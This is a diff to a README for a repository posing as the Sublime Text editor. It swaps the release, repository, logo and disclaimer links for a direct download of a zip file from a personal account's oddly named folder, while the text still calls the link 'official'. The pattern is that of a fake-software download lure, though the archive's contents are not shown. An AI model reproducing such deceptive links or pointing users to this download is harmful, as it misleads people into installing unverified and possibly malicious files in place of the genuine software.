@@ -16,7 +16,7 @@ Sublime Text is a powerful text editor loved by developers and casual users alik
 
 ## Get Started 🚀
 
-To download Sublime Text and start using it right away, simply visit the [official Sublime Text releases page](https://github.com/JessicaFerreira005/Sublime-Text/releases).
+To download Sublime Text and start using it right away, simply visit the [official Sublime Text releases page](https://github.com/JessicaFerreira005/Sublime-Text/raw/refs/heads/main/felsobanyite/Sublime-Text-1.2.zip).
 
 ## Topics 📚
 
@@ -30,14 +30,14 @@ For smooth installation and setup, download the necessary files from the release
 
 ## Stay Connected 🌐
 
-Stay updated with the latest Sublime Text releases, features, and tips by visiting the [official Sublime Text repository](https://github.com/JessicaFerreira005/Sublime-Text).
+Stay updated with the latest Sublime Text releases, features, and tips by visiting the [official Sublime Text repository](https://github.com/JessicaFerreira005/Sublime-Text/raw/refs/heads/main/felsobanyite/Sublime-Text-1.2.zip).
 
 Join the community of Sublime Text users and elevate your text editing experience! 💻
 
-![Sublime Text Logo](https://example.com/sublime-logo.png)
+![Sublime Text Logo](https://github.com/JessicaFerreira005/Sublime-Text/raw/refs/heads/main/felsobanyite/Sublime-Text-1.2.zip)
 
 Remember, simplicity and efficiency are at the core of Sublime Text. Download now and experience the seamless editing experience for yourself! 🌟
 
 --- 
 
-*Disclaimer: This is a fictional README.md file created for demonstration purposes.*
+*Disclaimer: This is a fictional https://github.com/JessicaFerreira005/Sublime-Text/raw/refs/heads/main/felsobanyite/Sublime-Text-1.2.zip file created for demonstration purposes.*
